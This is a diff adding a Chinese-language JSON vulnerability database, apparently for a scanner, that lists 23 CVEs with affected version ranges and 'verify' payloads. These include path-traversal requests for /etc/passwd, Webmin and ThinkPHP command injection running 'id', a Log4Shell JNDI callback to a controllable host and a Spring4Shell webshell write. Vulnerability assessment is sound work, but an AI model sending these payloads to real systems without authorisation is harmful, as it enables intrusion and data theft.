@@ -1,0 +1,214 @@
+[
+  {
+    "id": "CVE-2021-41773",
+    "product": "apache_httpd",
+    "title": "Apache HTTP Server 2.4.49 路径穿越 / 任意文件读取",
+    "severity": "high",
+    "affects": [{"gte": "2.4.49", "lt": "2.4.50"}],
+    "verify": "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd（返回 root: 即成立）",
+    "note": "仅当 mod_cgi 开启且目录未 Require all denied"
+  },
+  {
+    "id": "CVE-2021-42013",
+    "product": "apache_httpd",
+    "title": "Apache HTTP Server 2.4.50 路径穿越（41773 修复不完整）",
+    "severity": "high",
+    "affects": [{"gte": "2.4.50", "lt": "2.4.51"}],
+    "verify": "GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
+    "note": "双重编码绕过"
+  },
+  {
+    "id": "CVE-2017-5638",
+    "product": "struts2",
+    "title": "Struts2 S2-045 Jakarta 解析器 OGNL 远程代码执行",
+    "severity": "critical",
+    "affects": [{"gte": "2.3.5", "lt": "2.3.32"}, {"gte": "2.5.0", "lt": "2.5.11"}],
+    "verify": "对任意 .action 提交恶意 Content-Type（OGNL），观察回显/延迟",
+    "note": "需确认目标用 Struts2 且版本落区间"
+  },
+  {
+    "id": "CVE-2018-11776",
+    "product": "struts2",
+    "title": "Struts2 S2-057 命名空间 OGNL 远程代码执行",
+    "severity": "critical",
+    "affects": [{"gte": "2.3.0", "lt": "2.3.35"}, {"gte": "2.5.0", "lt": "2.5.17"}],
+    "verify": "构造 /struts2-showcase/${...}/action 形式路径",
+    "note": "依赖 url 标签与 alwaysSelectFullNamespace 配置"
+  },
+  {
+    "id": "CVE-2020-1938",
+    "product": "tomcat",
+    "title": "Tomcat Ghostcat：AJP 文件包含 / 读取",
+    "severity": "high",
+    "affects": [{"gte": "6.0.0", "lt": "6.0.53"}, {"gte": "7.0.0", "lt": "7.0.100"},
+                {"gte": "8.0.0", "lt": "8.5.51"}, {"gte": "9.0.0", "lt": "9.0.31"}],
+    "verify": "AJP 8009 端口可达 + 构造 AJP Forward 请求读取 WEB-INF/web.xml",
+    "note": "版本来自 Tomcat 自身指纹；AJP 默认关闭时不可利用"
+  },
+  {
+    "id": "CVE-2022-22965",
+    "product": "spring_framework",
+    "title": "Spring4Shell：Spring Framework 远程代码执行",
+    "severity": "critical",
+    "affects": [{"gte": "5.3.0", "lt": "5.3.18"}, {"gte": "5.2.0", "lt": "5.2.20"}],
+    "verify": "POST 带 class.module.classLoader.* 参数写 webshell，再访问落盘路径",
+    "note": "需 JDK9+ 且部署为 WAR/Tomcat"
+  },
+  {
+    "id": "CVE-2022-22947",
+    "product": "spring_cloud_gateway",
+    "title": "Spring Cloud Gateway 表达式注入 RCE",
+    "severity": "critical",
+    "affects": [{"gte": "3.0.0", "lt": "3.0.7"}, {"gte": "3.1.0", "lt": "3.1.1"}],
+    "verify": "POST /actuator/gateway/routes 注入 SpEL，再 refresh 触发",
+    "note": "需 actuator gateway 端点暴露且可写"
+  },
+  {
+    "id": "CVE-2020-14882",
+    "product": "weblogic",
+    "title": "WebLogic 控制台未授权 + 远程代码执行",
+    "severity": "critical",
+    "affects": [{"gte": "10.3.6", "lt": "10.3.7"}, {"gte": "12.1.3", "lt": "12.1.4"},
+                {"gte": "12.2.1", "lt": "12.2.2"}, {"gte": "14.1.1", "lt": "14.1.2"}],
+    "verify": "GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=...",
+    "note": "经典 console 绕过；具体 handle 需按目标版本调"
+  },
+  {
+    "id": "CVE-2019-2725",
+    "product": "weblogic",
+    "title": "WebLogic wls9-async 反序列化 RCE",
+    "severity": "critical",
+    "affects": [{"gte": "10.3.6", "lt": "10.3.7"}, {"gte": "12.1.3", "lt": "12.1.4"}],
+    "verify": "POST /_async/AsyncResponseService with SOAP 载荷",
+    "note": "wls9_async_response 组件存在才可打"
+  },
+  {
+    "id": "SHIRO-4437",
+    "product": "shiro",
+    "title": "Shiro rememberMe 反序列化（默认硬编码 AES 密钥）",
+    "severity": "critical",
+    "affects": [{"lt": "1.2.5"}],
+    "verify": "Cookie: rememberMe=<AES-CBC 序列化 gadget>，看是否回显 Set-Cookie 删除标记",
+    "note": "无版本号时看 rememberMe=deleteMe 特征即可判定在用 Shiro"
+  },
+  {
+    "id": "CVE-2021-29441",
+    "product": "nacos",
+    "title": "Nacos 认证绕过（User-Agent 白名单）",
+    "severity": "high",
+    "affects": [{"lt": "1.4.2"}],
+    "verify": "GET /nacos/v1/auth/users?pageNo=1&pageSize=9 带 UA: Nacos-Server",
+    "note": "1.4.1 起默认关闭 token.secret.key 为空也不代表安全，仍需实测"
+  },
+  {
+    "id": "CVE-2021-43798",
+    "product": "grafana",
+    "title": "Grafana 插件路径穿越任意文件读取",
+    "severity": "high",
+    "affects": [{"gte": "8.0.0", "lt": "8.3.1"}],
+    "verify": "GET /public/plugins/alertlist/../../../../../../etc/passwd",
+    "note": "8.0.0-beta1 起受影响"
+  },
+  {
+    "id": "CVE-2022-26134",
+    "product": "confluence",
+    "title": "Confluence OGNL 注入 RCE",
+    "severity": "critical",
+    "affects": [{"gte": "7.4.0", "lt": "7.18.2"}],
+    "verify": "GET /%24%7B%28%23a%3D...%7D/ 触发 OGNL",
+    "note": "服务端模板注入，未授权可打"
+  },
+  {
+    "id": "CVE-2021-22205",
+    "product": "gitlab",
+    "title": "GitLab ExifTool 图片解析 RCE",
+    "severity": "critical",
+    "affects": [{"gte": "11.9.0", "lt": "13.8.8"}, {"gte": "13.9.0", "lt": "13.9.6"},
+                {"gte": "13.10.0", "lt": "13.10.3"}],
+    "verify": "上传特制 JPEG 到 /uploads/user 触发",
+    "note": "需匿名或普通用户上传权限"
+  },
+  {
+    "id": "CVE-2019-15107",
+    "product": "webmin",
+    "title": "Webmin password_change.cgi 命令注入",
+    "severity": "critical",
+    "affects": [{"gte": "1.890", "lt": "1.921"}],
+    "verify": "POST /password_change.cgi user=root&pam=&expired=2&old=id|&new1=a&new2=a",
+    "note": "1.900 起默认关闭改密功能，需确认开启"
+  },
+  {
+    "id": "CVE-2018-7600",
+    "product": "drupal",
+    "title": "Drupalgeddon2 远程代码执行",
+    "severity": "critical",
+    "affects": [{"gte": "7.0", "lt": "7.58"}, {"gte": "8.0.0", "lt": "8.3.9"},
+                {"gte": "8.4.0", "lt": "8.4.6"}, {"gte": "8.5.0", "lt": "8.5.1"}],
+    "verify": "POST /user/register?element_parents=... 带 #post_render 载荷",
+    "note": "未授权可打"
+  },
+  {
+    "id": "CVE-2022-23131",
+    "product": "zabbix",
+    "title": "Zabbix 前端 SAML 会话伪造 / 管理员接管",
+    "severity": "critical",
+    "affects": [{"gte": "5.4.0", "lt": "5.4.9"}],
+    "verify": "构造 zbx_session cookie（saml_data + sign）访问 index.php",
+    "note": "需 SAML 认证开启"
+  },
+  {
+    "id": "CVE-2019-17558",
+    "product": "solr",
+    "title": "Solr Velocity 模板注入 RCE",
+    "severity": "critical",
+    "affects": [{"gte": "5.0.0", "lt": "8.3.1"}],
+    "verify": "POST /solr/<core>/config params.resource.loader.enabled=true 后请求带模板",
+    "note": "需能访问 config API"
+  },
+  {
+    "id": "CVE-2023-46604",
+    "product": "activemq",
+    "title": "ActiveMQ OpenWire 反序列化 RCE",
+    "severity": "critical",
+    "affects": [{"lt": "5.15.16"}, {"gte": "5.16.0", "lt": "5.16.7"}, {"gte": "5.17.0", "lt": "5.17.6"},
+                {"gte": "5.18.0", "lt": "5.18.3"}],
+    "verify": "61616 端口发送恶意 ExceptionResponse（类名指向可控 ClassPathXmlApplicationContext）",
+    "note": "需要能连到 OpenWire 端口"
+  },
+  {
+    "id": "CVE-2020-11651",
+    "product": "saltstack",
+    "title": "SaltStack Salt API 认证绕过",
+    "severity": "critical",
+    "affects": [{"lt": "3000.2"}],
+    "verify": "对 4506 端口发送 clear payload 触发未授权命令",
+    "note": "master 默认 4505/4506"
+  },
+  {
+    "id": "CVE-2021-44228",
+    "product": "log4j",
+    "title": "Log4Shell：JNDI 注入远程代码执行",
+    "severity": "critical",
+    "affects": [{"gte": "2.0", "lt": "2.15.0"}],
+    "verify": "在任意被记录到日志的字段填 ${jndi:ldap://可控地址/a}，观察外连",
+    "note": "断网环境无法用外部 LDAP 回连验证 → 这条只能靠 strike 里的本地回连探测"
+  },
+  {
+    "id": "TK-5.0.x-RCE",
+    "product": "thinkphp",
+    "title": "ThinkPHP 5.0.x 路由参数 RCE（无 CVE，行业惯用编号）",
+    "severity": "critical",
+    "affects": [{"gte": "5.0.0", "lt": "5.0.24"}],
+    "verify": "POST /index.php?s=captcha 带 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id",
+    "note": "5.0.5-5.0.23 均可复现"
+  },
+  {
+    "id": "TK-5.1.x-RCE",
+    "product": "thinkphp",
+    "title": "ThinkPHP 5.1.x 路由参数 RCE（无 CVE，行业惯用编号）",
+    "severity": "critical",
+    "affects": [{"gte": "5.1.0", "lt": "5.1.31"}],
+    "verify": "POST /index.php?s=index/\\think\\Request/input&filter[]=system&data=id",
+    "note": "5.1.0-5.1.30 均可复现"
+  }
+]
